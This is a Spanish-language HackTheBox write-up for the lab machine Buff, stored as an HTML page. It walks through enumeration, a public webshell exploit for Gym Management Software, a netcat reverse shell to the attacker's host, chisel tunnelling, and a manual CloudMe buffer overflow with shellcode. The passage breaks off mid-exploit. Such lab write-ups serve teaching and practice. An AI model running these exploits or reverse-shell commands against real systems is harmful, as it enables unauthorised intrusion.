@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Buff</title>
+
+  <meta name="description" content="Resolución de la máquina Buff de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Buff">
+  <meta name="twitter:description" content="Resolución de la máquina Buff de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/buff.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Buff">
+  <meta property="og:description" content="Resolución de la máquina Buff de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/buff.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/buff.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Buff" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-shaun">Shell - shaun</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#bof-stack">BOF - Stack Based</a></li>
+        <li><a href="#bof-seh">BOF - SEH Based</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/buff.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Buff</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo un puerto abierto, este es el <code class="language-plaintext highlighter-rouge">8080</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.198
+Nmap scan report for 10.10.10.198  
+PORT     STATE SERVICE
+8080/tcp open  http-proxy</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque es completamente innecesario, solo comodidad agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> el dominio <code class="language-plaintext highlighter-rouge">buff.htb</code> para que al apuntar a el nos lleve a la ip</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.198 buff.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La página del puerto <code class="language-plaintext highlighter-rouge">8080</code> parece bastante estatica sin nada demasiado interesante</p>
+<a href="/htb/buff/1.png" target="_blank"><div><p><img src="/htb/buff/1.png"></p></div></a>
+
+<p class="plain-text">En la pestaña de contacto logramos ver algo interesante que es la tecnologia que usa la web por detras, esta es <code class="language-plaintext highlighter-rouge">Gym Management Software</code> de version <code class="language-plaintext highlighter-rouge">1.0</code></p>
+<a href="/htb/buff/2.png" target="_blank"><div><p><img src="/htb/buff/2.png"></p></div></a>
+
+</section>
+
+<section class="post" id="shell-shaun">
+<br><h3 class="post-title">Shell - shaun</h3><br>
+
+<p class="plain-text">Buscando vulnerabilidades para este servicio llegamos a un <a href="https://exploit-db.com/exploits/48506">exploit</a> que nos permite llegar a ejecutar comandos en el equipo, en este caso como el usuario <code class="language-plaintext highlighter-rouge">shaun</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">48506.py http://buff.htb:8080/
+            </span><span class="ve">/\</span><span class="p">
+</span><span class="am">/vvvvvvvvvvvv </span><span class="ve">\</span><span class="p">--------------------------------------,  
+</span><span class="am">`^^^^^^^^^^^^ </span><span class="ve">/</span><span class="p">============</span><span class="ro">BOKU</span><span class="p">====================="
+            </span><span class="ve">\/</span><span class="p">
+
+</span><span class="ve">[+] </span><span class="p">Successfully connected to webshell.
+</span><span class="ve">C:\xampp\htdocs\gym\upload> </span><span class="p">whoami
+buff\shaun
+
+</span><span class="ve">C:\xampp\htdocs\gym\upload></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para conseguir una shell algo mas interactiva podemos descargar y ejecutar <code class="language-plaintext highlighter-rouge">netcat</code> para enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code>, ya con la shell podemos leer la primer <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">C:\xampp\htdocs\gym\upload> </span><span class="p">curl 10.10.14.10/netcat.exe -o C:\ProgramData\netcat.exe  
+
+</span><span class="ve">C:\xampp\htdocs\gym\upload> </span><span class="p">C:\ProgramData\netcat.exe -e powershell 10.10.14.10 443  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.198
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\xampp\htdocs\gym\upload> </span><span class="am">whoami</span><span class="p">
+buff\shaun
+PS C:\xampp\htdocs\gym\upload> </span><span class="am">type </span><span class="p">C:\Users\shaun\Desktop\user.txt  
+bf4**************************a26
+PS C:\xampp\htdocs\gym\upload></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Algo interesante es que en la carpeta de descargas del usuario shaun podemos ver el instalador de <code class="language-plaintext highlighter-rouge">CloudMe</code> de versión <code class="language-plaintext highlighter-rouge">1.11.2</code> que parece ser bastante antigua</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\shaun\Downloads> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\shaun\Downloads
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe  
+
+PS C:\Users\shaun\Downloads></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando los procesos actuales podemos ver que el programa <code class="language-plaintext highlighter-rouge">CloudMe</code> esta corriendo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\shaun\Downloads> </span><span class="am">Get-Process </span><span class="p">| </span><span class="am">Select-Object </span><span class="c1">-First </span><span class="p">5
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    438      24    20124      26260              6488   1 ApplicationFrameHost  
+    161      10     1936       7244              7012   1 browser_broker
+    320      22    29024      35780              8456   0 CloudMe
+     41       5     4812       3352               432   0 cmd
+     50       4     1980        280       0.00    792   0 cmd
+
+PS C:\Users\shaun\Downloads></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo el puerto <code class="language-plaintext highlighter-rouge">8888</code> del programa solo se expone en local por lo que tendremos que usar <code class="language-plaintext highlighter-rouge">chisel</code> para transferir ese puerto a nuestro host y tener conexion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">curl </span><span class="p">10.10.14.10/chisel.exe </span><span class="c1">-o </span><span class="p">chisel.exe
+PS C:\ProgramData> </span><span class="am">.\chisel.exe </span><span class="p">client 10.10.14.10:9999 R:8888:127.0.0.1:8888  
+client: Connecting to ws://10.10.14.10:9999
+client: Connected (Latency 12.395ms)</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="bof-stack">
+<br><h3 class="post-title">Buffer Overflow - Stack Based</h3><br>
+
+<p class="plain-text">Aunque hay algunos <a href="https://exploit-db.com/exploits/48389">exploits</a> publicos explotaremos el Buffer Overflow manualmente, para trabajar con los registros usaremos <a href="https://x64dbg.com/">x32dbg</a> con el plugin <a href="https://github.com/x64dbg/x64dbgpy">x64dbgpy</a> y el modulo <a href="https://github.com/corelan/mona">mona</a>, asi que abrimos <code class="language-plaintext highlighter-rouge">CloudMe</code> y lo corremos, ademas de importar el modulo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">from mona import mona</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/3.png" target="_blank"><div><p><img src="/htb/buff/3.png"></p></div></a>
+
+<p class="plain-text">Creamos un script de python que se conecte al puerto 8888 y envie <code class="language-plaintext highlighter-rouge">1500 A's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">1500
+</span><span class="p">
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)  
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit el programa se corrompe y en el debugger ahora el registro EIP vale <code class="language-plaintext highlighter-rouge">0x41414141</code> que es 4 A's en hexadecimal, nuestra idea sera controlar ese puntero</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 127.0.0.1 on port 8888: Done  
+[</span><span class="az">*</span><span class="p">] Closed connection to 127.0.0.1 port 8888</span>
+</code></pre></div></div><br>
+
+<a href="/htb/buff/4.png" target="_blank"><div><p><img src="/htb/buff/4.png"></p></div></a>
+
+<p class="plain-text">Necesitamos encontrar la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a <code class="language-plaintext highlighter-rouge">EIP</code> creamos una cadena especial de <code class="language-plaintext highlighter-rouge">1500</code> caracteres usando <code class="language-plaintext highlighter-rouge">pattern_create</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("pattern_create 1500")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/5.png" target="_blank"><div><p><img src="/htb/buff/5.png"></p></div></a>
+
+<p class="plain-text">Modificamos el script cambiando las <code class="language-plaintext highlighter-rouge">A's</code> por la cadena especialmente diseñada para encontrar un <code class="language-plaintext highlighter-rouge">offset</code>, corremos de nuevo el programa y nuevamente se corrompe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"</span><span class="p">  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">,</span><span class="mi"> 8888</span><span class="p">)
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<a href="/htb/buff/6.png" target="_blank"><div><p><img src="/htb/buff/6.png"></p></div></a>
+
+<p class="plain-text">Lo que haremos sera usar <code class="language-plaintext highlighter-rouge">pattern_offset</code> para encontrar el offset o bytes basura necesarios, le pasamos como argumento el valor de <code class="language-plaintext highlighter-rouge">EIP</code> y nos dice que son <code class="language-plaintext highlighter-rouge">1052</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("pattern_offset eip")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/7.png" target="_blank"><div><p><img src="/htb/buff/7.png"></p></div></a>
+
+<p class="plain-text">Para comprobarlo enviaremos <code class="language-plaintext highlighter-rouge">A's</code> hasta antes de sobreescribir el EIP, en ese registro enviaremos 4 <code class="language-plaintext highlighter-rouge">B's</code> y como si fuera shellcode dejaremos <code class="language-plaintext highlighter-rouge">C's</code> en el stack o ESP</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+offset </span><span class="o">= </span><span class="mi">1052</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
+esp </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">esp
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)  
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar el exploit podemos ver que EIP vale <code class="language-plaintext highlighter-rouge">0x42424242</code> que son las B's y justo en el stack estan las <code class="language-plaintext highlighter-rouge">C's</code>, la idea sera saltar al ESP para que se interpreten</p>
+<a href="/htb/buff/8.png" target="_blank"><div><p><img src="/htb/buff/8.png"></p></div></a>
+
+<p class="plain-text">Lo siguiente sera detectar <code class="language-plaintext highlighter-rouge">badchars</code> por lo que con <code class="language-plaintext highlighter-rouge">mona</code> crearemos una lista con todos los caracteres posibles, esto nos creara un archivo <code class="language-plaintext highlighter-rouge">txt</code> y un <code class="language-plaintext highlighter-rouge">bin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("bytearray")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/9.png" target="_blank"><div><p><img src="/htb/buff/9.png"></p></div></a>
+
+<p class="plain-text">Modificaremos el script para que despues del <code class="language-plaintext highlighter-rouge">EIP</code> envie nuestros posibles badchars</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+offset </span><span class="o">= </span><span class="mi">1052</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
+
+badchars </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"</span><span class="p">  
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"</span><span class="p">  
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"</span><span class="p">  
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"</span><span class="p">  
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"</span><span class="p">  
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"</span><span class="p">  
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"</span><span class="p">  
+badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">badchars
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">8888</span><span class="p">)
+shell.sendline(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enviamos y al volver a hacer el <code class="language-plaintext highlighter-rouge">mona compare</code> podemos ver <code class="language-plaintext highlighter-rouge">unmodified</code> quiere decir que todos los caracteres enviados se procesaron correctamente en el programa</p>
+<a href="/htb/buff/10.png" target="_blank"><div><p><img src="/htb/buff/10.png"></p></div></a>
+
+<p class="plain-text">Listando los modulos con <code class="language-plaintext highlighter-rouge">mona</code> encontramos la libreria <code class="language-plaintext highlighter-rouge">qt5core.dll</code> sin nunguna proteccion, podemos buscar en el un <code class="language-plaintext highlighter-rouge">gadget</code> para saltar y ejecutar el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("modules")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/11.png" target="_blank"><div><p><img src="/htb/buff/11.png"></p></div></a>
+
+<p class="plain-text">Para saltar a la pila donde enviaremos el shellcode y se interprete necesitamos una dirección con un gadget que llame al <code class="language-plaintext highlighter-rouge">ESP</code>, con mona encontramos varias</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("jmp -r esp -m qt5core.dll")</span>
+</code></pre></div></div><br>
+<a href="/htb/buff/12.png" target="_blank"><div><p><img src="/htb/buff/12.png"></p></div></a>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">msfvenom</code> crearemos un <code class="language-plaintext highlighter-rouge">shellcode</code> que solo nos ejecute una <code class="language-plaintext highlighter-rouge">calculadora</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 193 bytes
+Final size of python file: 1095 bytes
+shellcode =  b""
+shellcode =  b""
+shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
+shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
+shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
+shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
+shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
+shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
+shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
+shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
+shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
+shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
+shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
+shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
+shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
+shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
+shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
+shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
+shellcode += b"\x63\x2e\x65\x78\x65\x00"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El exploit final enviara basura hasta entes del <code class="language-plaintext highlighter-rouge">EIP</code>, en el escribira una direccion que ejecuta un <code class="language-plaintext highlighter-rouge">call esp</code> y como ahi estará nuestro shellcode lo interpretara</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
+
+offset </span><span class="o">= </span><span class="mi">1052</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+callesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x68f7bcdb</span><span class="p">)
+
+shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0</span><span class="s">"</span><span class="p">  
